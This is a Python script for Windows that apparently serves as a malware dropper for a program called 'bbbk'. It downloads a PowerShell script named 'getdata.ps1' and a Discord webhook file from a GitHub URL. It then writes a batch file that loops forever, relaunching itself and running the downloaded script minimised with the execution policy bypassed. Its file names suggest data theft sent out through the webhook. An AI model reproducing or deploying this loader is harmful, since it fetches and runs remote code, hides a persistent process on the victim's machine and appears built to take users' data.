import getpass
import os
import winreg
from pathlib import Path
from os.path import exists as exist
from urllib import request
import platform

if not platform.system() == "Windows":
    import sys
    input("this OS is not suported please change to windows befor starting agen press enter when done ")
    sys.exit(0)

try:
    user = getpass.getuser()
except Exception:
    user = os.environ.get("USERNAME", "Default")

def get_windows_desktop():
    registry_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, 
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
    )
    
    raw_path, _ = winreg.QueryValueEx(registry_key, "Desktop")
    winreg.CloseKey(registry_key)
    expanded_path = os.path.expandvars(raw_path)

    return Path(expanded_path)

program_name = "bbbk"
where = {"desktop": get_windows_desktop(), "main": f"C:\\Users\\{user}\\{program_name}\\main", "perts": f"C:\\Users\\{user}\\{program_name}\\perts", "main_program": f"C:\\Users\\{user}\\{program_name}\\main\\{program_name}.py", "restarter": f"C:\\Users\\{user}\\{program_name}\\perts\\restarter.bat", "installer": f"C:\\Users\\{user}\\{program_name}\\perts\\installer", "installer_exe": f"C:\\Users\\{user}\\{program_name}\\perts\\installer\\installer.exe", "installer_config": f"C:\\Users\\{user}\\{program_name}\\perts\\installer\\config.txt", "getdata": f"C:\\Users\\{user}\\{program_name}\\perts\\getdata.ps1", "sender": f"C:\\Users\\{user}\\{program_name}\\perts\\send.bat"}

restarter = f"""
@echo off
title restarter
goto loop

:loop
tasklist /fi "imagename eq {program_name}.py" | find /i "{program_name}.py" >nul
if %errorlevel%==0 (
    tasklist /fi "imagename eq getdata.ps1" | find /i "getdata.ps1" >nul
    if %errorlevel%==0 (
        timeout 3
    ) else (
        start "" /min cmd /c "powershell -ExecutionPolicy Bypass -File {where['getdata']}"
    )
    timeout 3
) else (
    start "" /min cmd /c "python {where['main_program']}"
)
goto loop
"""

try:
    import psutil
except ModuleNotFoundError:
    os.system("python -m pip install psutil")
    try:
        import psutil
    except ModuleNotFoundError:
        os.system("python -m pip install --upgrade psutil")
        import psutil

def is_script_running(script_name):
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = proc.info['cmdline']
            if cmdline and any(script_name in arg for arg in cmdline):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

while True:
    if not exist(where["main"]):
        os.mkdir(where["main"])

    if not exist(where["perts"]):
        os.mkdir(where["perts"])

    if not exist(where["installer"]):
        os.mkdir(where["installer"])

    if not exist(where["getdata"]):
        try:
            with request.urlopen("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", timeout=15) as response:
                if response.status == 200:
                    with open(where["getdata"], "wb") as file:
                        file.write(response.read())
        except Exception as exc:
            print(f"Failed to download file: {exc}")

        try:
            with request.urlopen("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/discord_webhook.txt", timeout=15) as response:
                if response.status == 200:
                    with open(os.path.join(where["perts"], "discord_webhook.txt"), "wb") as file:
                        file.write(response.read())
        except Exception as exc:
            print(f"Failed to download file: {exc}")

    if not exist(where["restarter"]):
        with open(where["restarter"], "w") as file:
            file.write(restarter)

    if not is_script_running("restarter.bat"):
        os.startfile(where["restarter"])